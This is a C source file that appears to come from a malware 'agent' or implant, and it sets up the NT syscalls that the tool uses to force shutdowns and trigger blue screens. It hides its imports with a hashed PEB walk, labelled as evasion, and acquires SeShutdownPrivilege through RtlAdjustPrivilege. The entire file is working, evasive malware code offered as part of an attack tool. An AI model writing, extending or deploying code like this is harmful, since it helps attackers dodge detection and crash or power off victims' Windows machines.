/*
 * client/ntcalls.c  –  NT syscall loader and privilege check
 * ===========================================================
 * Implements ntcalls_load() and ntcalls_verify() declared in ntcalls.h.
 * All NT function pointer globals are defined here.
 *
 * IAT-clean: GetModuleHandleW and GetProcAddress replaced with PEB walk so
 * those high-signal imports do not appear in the agent's import table.
 *
 * Troubleshooting return values
 * ──────────────────────────────
 * ntcalls_load():
 *   0x00  ntdll.dll not found in PEB (should never happen)
 *   0x01  RtlAdjustPrivilege    not exported by ntdll
 *   0x02  NtShutdownSystem      not exported by ntdll
 *   0x04  NtSetSystemPowerState not exported by ntdll
 *   0x08  NtRaiseHardError      not exported by ntdll
 *   Any combination is OR'd together; 0x0F = all four missing.
 *   0xFF  success (all four resolved)
 *
 * ntcalls_verify():
 *   0x00  success — all four pointers non-NULL, SeShutdownPrivilege acquired
 *   0x01  RtlAdjustPrivilege    is NULL (ntcalls_load not called or failed)
 *   0x02  NtShutdownSystem      is NULL
 *   0x04  NtSetSystemPowerState is NULL
 *   0x08  NtRaiseHardError      is NULL
 *   0x10  RtlAdjustPrivilege call returned a non-success NTSTATUS
 *         (privilege denied — forceOff/blueScreen will fail at runtime)
 *   Multiple failures OR'd together; e.g. 0x03 = first two pointers NULL.
 */

#include "ntcalls.h"
#include "../evasion/peb_walk.h"
#include "../debug/agent_debug.h"

/* ── Global NT function pointers (all start NULL) ───────────────────────── */
NTSTATUS (NTAPI *RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN) = NULL;
NTSTATUS (NTAPI *NtShutdownSystem)(_In_ SHUTDOWN_ACTION)                = NULL;
NTSTATUS (NTAPI *NtSetSystemPowerState)(_In_ POWER_ACTION,
                                         _In_ SYSTEM_POWER_STATE,
                                         _In_ ULONG)                    = NULL;
NTSTATUS (NTAPI *NtRaiseHardError)(NTSTATUS, ULONG, ULONG,
                                    PULONG_PTR, ULONG, PULONG)          = NULL;

ULONG g_hardErrorResponse = 0;


/* ── ntcalls_load ───────────────────────────────────────────────────────── */
/*
 * Returns 0xFF on full success.
 * Returns 0x00 if ntdll itself was not found.
 * Returns a bitmask of missing exports (bits 0-3) if ntdll was found but
 * one or more functions could not be resolved:
 *   bit 0 (0x01) – RtlAdjustPrivilege    missing
 *   bit 1 (0x02) – NtShutdownSystem      missing
 *   bit 2 (0x04) – NtSetSystemPowerState missing
 *   bit 3 (0x08) – NtRaiseHardError      missing
 * Callers that only need a pass/fail check: treat 0xFF as TRUE, anything
 * else (including 0x00) as FALSE.
 */

DWORD ntcalls_load(void)
{
    /* Resolve ntdll via PEB walk — no GetModuleHandleW in IAT */
    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
    if (!hNtdll) {
        DBG_LOG(DBG_SS_NTCALL, DBG_ERR, "ntcalls_load: peb_get_module(ntdll) returned NULL");
        return 0x00;
    }
    DBG_LOG(DBG_SS_NTCALL, DBG_INFO, "ntcalls_load: ntdll base = 0x%p", hNtdll);

    DWORD missing = 0;

    RtlAdjustPrivilege    = (PVOID)peb_get_export(hNtdll, peb_hash_str("RtlAdjustPrivilege"));
    NtShutdownSystem      = (PVOID)peb_get_export(hNtdll, peb_hash_str("NtShutdownSystem"));
    NtSetSystemPowerState = (PVOID)peb_get_export(hNtdll, peb_hash_str("NtSetSystemPowerState"));
    NtRaiseHardError      = (PVOID)peb_get_export(hNtdll, peb_hash_str("NtRaiseHardError"));

    DBG_LOG(DBG_SS_NTCALL, DBG_INFO,
            "ntcalls_load: RtlAdjustPrivilege    @ 0x%p", (void *)RtlAdjustPrivilege);
    DBG_LOG(DBG_SS_NTCALL, DBG_INFO,
            "ntcalls_load: NtShutdownSystem      @ 0x%p", (void *)NtShutdownSystem);
    DBG_LOG(DBG_SS_NTCALL, DBG_INFO,
            "ntcalls_load: NtSetSystemPowerState @ 0x%p", (void *)NtSetSystemPowerState);
    DBG_LOG(DBG_SS_NTCALL, DBG_INFO,
            "ntcalls_load: NtRaiseHardError      @ 0x%p", (void *)NtRaiseHardError);

    if (!RtlAdjustPrivilege)    missing |= 0x01;
    if (!NtShutdownSystem)      missing |= 0x02;
    if (!NtSetSystemPowerState) missing |= 0x04;
    if (!NtRaiseHardError)      missing |= 0x08;

    /* 0xFF = all four resolved; non-zero missing = partial/full failure */
    DWORD rc = (missing == 0) ? 0xFF : missing;
    DBG_LOG(DBG_SS_NTCALL, (rc == 0xFF) ? DBG_OK : DBG_WARN,
            "ntcalls_load() returning 0x%02lX", rc);
    return rc;
}


/* ── ntcalls_verify ─────────────────────────────────────────────────────── */
/*
 * Returns 0x00 on full success (all pointers valid, privilege acquired).
 * Returns a bitmask describing every failure found:
 *   bit 0 (0x01) – RtlAdjustPrivilege    is NULL
 *   bit 1 (0x02) – NtShutdownSystem      is NULL
 *   bit 2 (0x04) – NtSetSystemPowerState is NULL
 *   bit 3 (0x08) – NtRaiseHardError      is NULL
 *   bit 4 (0x10) – RtlAdjustPrivilege returned non-STATUS_SUCCESS
 *                  (SeShutdownPrivilege could not be acquired)
 * 0x00 is the only fully-passing result.
 */

DWORD ntcalls_verify(void)
{
    DWORD flags = 0;

    if (!RtlAdjustPrivilege)    flags |= 0x01;
    if (!NtShutdownSystem)      flags |= 0x02;
    if (!NtSetSystemPowerState) flags |= 0x04;
    if (!NtRaiseHardError)      flags |= 0x08;

    /* Only attempt privilege escalation if the pointer actually resolved */
    if (RtlAdjustPrivilege) {
        /*
         * Attempt to acquire SeShutdownPrivilege (privilege index 19).
         * RtlAdjustPrivilege returns STATUS_SUCCESS (0) on success.
         * Non-zero = denied or error; flag it so the caller knows
         * forceOff/blueScreen will fail at runtime.
         */
        BOOLEAN  prevState = FALSE;
        NTSTATUS ns = RtlAdjustPrivilege(19, TRUE, FALSE, &prevState);
        DBG_LOG(DBG_SS_NTCALL, (ns == 0) ? DBG_OK : DBG_WARN,
                "ntcalls_verify: RtlAdjustPrivilege(SeShutdownPrivilege) = 0x%08lX%s",
                (ULONG)ns, (ns == 0) ? "" : " — privilege DENIED");
        if (ns != 0) flags |= 0x10;
    }

    DBG_LOG(DBG_SS_NTCALL, (flags == 0) ? DBG_OK : DBG_WARN,
            "ntcalls_verify() returning 0x%02lX", flags);
    return flags;   /* 0x00 = everything OK */
}
